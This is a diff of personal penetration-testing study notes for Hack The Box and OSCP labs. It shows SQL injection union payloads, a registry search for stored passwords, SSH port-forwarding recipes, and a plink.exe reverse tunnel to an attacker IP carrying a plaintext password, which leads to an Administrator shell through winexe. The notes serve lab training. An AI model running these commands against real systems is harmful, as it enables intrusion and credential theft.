@@ -1,4 +1,6 @@
 HTB writeups machines --> https://rana-khalil.gitbook.io/hack-the-box-oscp-preparation/
+nishang is a Offensive PowerShell for red team
+- https://github.com/samratashok/nishang
 - the appropriate msfvenom payload for each webserver. you need to check the framework from wappalyzer
 -     https://book.hacktricks.xyz/generic-methodologies-and-resources/shells/msfvenom
 ------------------------------------------------------------------cross site scripting-----------------------------------------------------------------------
@@ -87,7 +89,7 @@ To automate the process, use the following tools
 - find table name from information_schema.tables
 -     /filter?category=Food+%26+Drink'union+select+table_schema,table_name+from+information_schema.tables--+
 -     https://www.sqlinjection.net/table-names/
-- find column name from the table
+- find the column name from the table
 -     /filter?category=Pets'union+select+null,column_name+from+information_schema.columns+where+table_name='users_kuqbsq'--%20
 -     https://www.sqlinjection.net/column-names/
 - Blined BOOLEAN SQL INJECTION
@@ -212,6 +214,16 @@ use the following website for the rainbow table attack
 - assuming that the website has an SSL certificate on the browser. you need to fix the exploit by adding 'verify=False' in the post request.
 -     response = requests.post(url, data=data, allow_redirects=False, verify=False)
 
+--------------------------------------------------------------------Tunneling & Port Redirection----------------------------------------------------------------------
+- SSH Local Port Forwarding (from the attacher machine you connect to the machin2) (In this scenario only one machine can access the service)
+-     ssh -l 127.0.0.1:<SerivePort>:<Machine2>:<SerivePort> raman@<Machine1>
+-     curl 127.0.0.1:80
+- SSH Remote Port Forwarding (make a reverse connection from Machine2 to the attacker machine) (no machine can access the service unless the local machine)
+-     ssh -R <PortThatUWillBeListeningFrom ex.8080>:127.0.0.1:<ServicePort> raman@<YourIP>
+- SSH Dynamic Port Forwarding
+-     ssh -D <PortThatUWillBeListeningFrom ex.8080> raman@<Machine that can access the website>
+-     then go to firefox --> proxy --> choose manual proxy --> set SOCKS Host to 127.0.0.1 & Port 8080
+
 -----------------------------------------------------------------Windows Privilege Escalation TCM---------------------------------------------------------------------
 - https://github.com/TCM-Course-Resources/Windows-Privilege-Escalation-Resources
 - system enum
@@ -237,11 +249,29 @@ use the following website for the rainbow table attack
 -     sc query windefend
 -     netsh firewall show state
 -     netsh advfirewall firewall dump
+  
 - Stored Passwrods
 - https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_windows.html
-- check the open ports in the machine
+- check the registry. you may find a default password
+-     reg query HKLM /f password /t REG_SZ /s
+- Port Forwarding
+- - check the open ports in the machine
 -     netstat -ano
-- 
+- after netstat -ano command you find a public port you can use plink.exe to connect to that port
+- transfer plink.exe file to the windows machine using cetutil tool
+- install ssh and edit the config file
+-     apt install ssh && gedit /etc/ssh/sshd_config
+- change #PermitRootLogin line in the sshd_config file to the following
+-     PermitRootLogin yes
+-     service ssh restart && service ssh enable
+- from the Windows machine
+-     plink.exe -l <KaliUser> -pw <KaliPasswd> -R <ServicePort in Windows>:127.0.0.1:<KaliPort> <KaliIP>
+- assume windows has a local smb service running on 445 and your kali machine is 10.10.16.9
+-     plink.exe -l raman -pw to0or -R 445:127.0.0.1:445 10.10.16.9
+- keep on hitting enter and you will get a root shell (this is the windows machine not kali machine)
+- now you need to use winexe tool to execute a command in windows
+-     winexe -U Administrator%<Password that you found in the registry> //127.0.0.1 "cmd.exe"
+- run the command multiple times if it doesn't work
 -----------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Platforms
 1. for Initial Access work on eJPT, This article and official content 
